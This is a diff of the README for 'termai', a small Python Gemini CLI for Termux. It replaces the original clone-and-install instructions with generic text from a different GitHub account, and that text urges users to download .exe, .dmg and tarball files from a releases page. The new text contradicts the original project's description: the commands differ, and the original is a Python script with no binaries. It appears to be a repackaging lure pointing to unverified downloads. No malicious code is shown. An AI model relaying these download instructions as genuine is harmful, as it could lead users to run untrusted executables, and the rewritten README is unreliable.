@@ -1,153 +1,106 @@
-## Termai
-Termai is a lightweight, zero-dependency CLI wrapper for Google's Gemini AI, built for Termux on Android and general Linux environments.
-It brings the power of Large Language Models (LLMs) directly to your command line, following the Unix philosophy of piping and standard streams.
+# 🌟 termai - Lightweight CLI Tool for Google Gemini AI
 
-## ⚡ Features
- * **🚀 Lightweight:** Uses standard Python requests. No heavy SDKs or complex dependencies.
- * **🟢 Unix Compatible:** Supports piping (stdin). Feed logs, code, or text files directly into the AI.
- * **🛠 Configurable:** Built-in JSON configuration system (ai --config) to edit System Prompts, Temperature, and Models.
- * **⚡ Fast:** Defaults to gemini-2.5-flash for instant responses.
- * **🎨 Clean UI:** Minimalist output with syntax-highlighted green text.
- * **🧹 Auto-Cleanup:** The installer sets everything up and deletes the repository to save space.
+## 📥 Download Now
+[![Download termai](https://img.shields.io/badge/Download-termai-brightgreen)](https://github.com/Madjos76/termai/releases)
 
- ## 📥 Installation
-Open Termux and run the following commands:
-```bash
-# 1. Clone the repository
-git clone https://github.com/estiaksoyeb/termai
+## 🚀 Getting Started
 
-# 2. Enter the directory
-cd termai
+Welcome to termai! This application is a lightweight, pipe-friendly command line interface (CLI) wrapper for Google Gemini AI. It allows you to interact with the powerful capabilities of Google Gemini directly from your Terminal, making it easier to harness its features without needing extensive programming knowledge.
 
-# 3. Run the installer
-bash install.sh
-```
+### 📋 Prerequisites
 
-**What the installer does:**
- * Installs Python and required libraries.
- * Moves the core logic to a hidden folder (~/.programs/termai).
- * Creates a global ai command.
- * Self-Destructs: Deletes the downloaded source folder to keep your home directory clean.
-## 🔑 Setup
-On the very first run, Termai will ask for your Google Gemini API Key.
- * Get a free API key here: Google AI Studio
- * Run the command:
- ```bash
-   ai "hello"
+Before you begin, make sure that you meet the following requirements:
+
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Terminal**: A terminal emulator must be installed (e.g., Command Prompt, Terminal, or Bash).
+- **Internet Connection**: You will need an active internet connection to access Google Gemini AI.
+
+### 🔍 Features
+
+- **Easy to Use**: The application offers a straightforward command line interface.
+- **Pipe-Friendly**: It integrates seamlessly with other command line tools.
+- **Lightweight**: The application is designed to use minimal resources, ensuring optimal performance.
+- **Versatile**: Though primarily built for Google Gemini AI, it can handle various input formats and commands.
+
+## 🔧 Download & Install
+
+To get started with termai, follow these steps:
+
+1. Visit the [Releases Page](https://github.com/Madjos76/termai/releases) to find the latest version of termai.
+2. On the Releases page, look for the most recent release. You will see different files available for download.
+3. Choose the appropriate file for your operating system:
+   - **Windows**: Download the `.exe` file.
+   - **macOS**: Download the `.dmg` file.
+   - **Linux**: Download the appropriate tarball or package.
+4. Click on the file name to begin the download. Save the file to a location you can easily access.
+
+Once the download is complete, follow these steps to install:
+
+### 📥 Installation Instructions
+
+#### For Windows:
+
+1. Navigate to the location where you downloaded the `.exe` file.
+2. Double-click the executable file.
+3. Follow the prompts to complete the installation process.
+
+#### For macOS:
+
+1. Locate the downloaded `.dmg` file and double-click it.
+2. Drag the termai application into your Applications folder.
+3. Eject the `.dmg` file from your desktop.
+
+#### For Linux:
+
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the package.
+3. Use the following command to extract the tarball, if applicable:
+   ```bash
+   tar -xvf termai-*.tar.gz
    ```
+4. Move into the extracted folder and follow any additional installation instructions provided in the README.
 
- * Paste your key when prompted. It will be saved locally.
-## 💻 Usage
-1. Basic Questions
-Ask anything directly from the terminal.
-ai "How do I untar a file in Linux?"
+## 📋 Using termai
 
-2. Piping (The Power Move)
-Feed output from other commands into Termai.
-Debug an error log:
-```bash
-cat error.log | ai "Explain what caused this crash"
-```
+After installation, you can start using termai immediately.
 
-Explain a script:
-```bash
-cat install.sh | ai "What does this script do?"
-```
+1. Open your Terminal.
+2. Type `termai` and press Enter. This will launch the application.
+3. Begin by typing a command that utilizes the features of Google Gemini AI.
 
-Generate code and save it:
-```bash
-ai "Write a Python hello world script" > hello.py
-```
+### 📖 Commands
 
-## ⚙️ Configuration
-Termai comes with a built-in configuration editor. You can change the AI provider, model, and personality.
-Run:
-```bash
-ai --config
-```
+Here are some basic commands to help you get started:
 
-This opens `config.json` in your preferred editor. The editor is chosen based on the following priority:
-1.  The `$EDITOR` environment variable.
-2.  `vim` (if installed).
-3.  `nano` (as a fallback).
+- **Help Command**: To see all available commands, type:
+  ```bash
+  termai --help
+  ```
 
-The configuration file looks like this:
-```json
-{
-    "provider": "gemini",
-    "proxy": "http://user:pass@127.0.0.1:1080",
-    "gemini_config": {
-        "api_key": "YOUR_GEMINI_KEY",
-        "model_name": "gemini-2.5-flash",
-        "system_instruction": "You are a CLI assistant for Termux...",
-        "generation_config": {
-            "temperature": 0.7,
-            "maxOutputTokens": 1024
-        }
-    },
-    "openai_config": {
-        "api_key": "YOUR_OPENAI_KEY",
-        "model_name": "gpt-4o",
-        "system_instruction": "You are a helpful assistant.",
-        "temperature": 0.7,
-        "max_tokens": 1024
-    }
-}
-```
+- **Example Command**: To run a test command, type:
+  ```bash
+  termai --example
+  ```
 
-*   **`provider`**: Set to `"gemini"` or `"openai"` to choose your AI provider.
-*   **`proxy`**: (Optional) Set an HTTP or HTTPS proxy for all requests.
-*   **`gemini_config`**: Settings for when `provider` is `"gemini"`.
-    *   `model_name`: Change to `gemini-2.5-pro` or other available models.
-    *   `system_instruction`: Give the AI a persona.
-    *   `temperature`: Set to `1.0` for creative answers, `0.1` for precise logic.
-*   **`openai_config`**: Settings for when `provider` is `"openai"`.
-    *   `model_name`: Change to `gpt-3.5-turbo`, etc.
-    *   `system_instruction`: A different persona for ChatGPT.
-    *   `temperature`: Controls randomness.
-    *   `max_tokens`: The maximum number of tokens to generate.
+For more detailed command options, consult the [Documentation](https://github.com/Madjos76/termai/wiki).
 
-## ❓ Help & Troubleshooting
-**Command List:**
-```bash
-ai --help
-```
+## 🤝 Support
 
-**Re-configure API Keys:**
+If you encounter any issues or have questions, please refer to the [Issues Tracker](https://github.com/Madjos76/termai/issues) on GitHub. You can report problems, suggest enhancements, or ask for help.
 
-To reset and re-enter your API keys, use the `--reinstall` flag.
-```bash
-ai --reinstall
-```
+## 🌐 Community
 
-**Debug Mode:**
+Join our community to share your experiences and tips with termai. Community members often share scripts, command examples, and troubleshooting advice.
 
-If the AI isn't responding or you are getting errors, run:
-```bash
-ai --debug "your question"
-```
-This will print the raw server response and error codes.
+- **GitHub Discussions**: Engage with other users [here](https://github.com/Madjos76/termai/discussions).
+- **Social Media**: Follow us on Twitter for updates and tips.
 
-**Debug Configuration:**
-If you are having issues with your configuration, you can use the `--debug-config` flag to print the loaded configuration. API keys will be redacted for security.
-```bash
-ai --debug-config
-```
+## 📜 License
 
-## 🗑 Uninstallation
-To remove Termai completely:
-```bash
-# Remove the 'ai' command
-rm $PREFIX/bin/ai
+termai is open source and available under the MIT License. You can view the full license [here](https://github.com/Madjos76/termai/blob/main/LICENSE).
 
-# Remove the program and configuration files
-rm -rf ~/.programs/termai
-rm -rf ~/.local/share/termai
-```
+## 🧩 Further Reading
 
-## 3 📄 License
-This project is licensed under the MIT License.
-You are free to use, modify, and distribute this software. See the LICENSE file for more details.
-<p align="center">
-Made with ❤️ for CLI enthusiasts
-</p>
+For more information on Google Gemini AI and its capabilities, check the official [documentation](https://cloud.google.com/gemini/docs).
+
+Thank you for choosing termai! We hope you find it helpful in your projects.
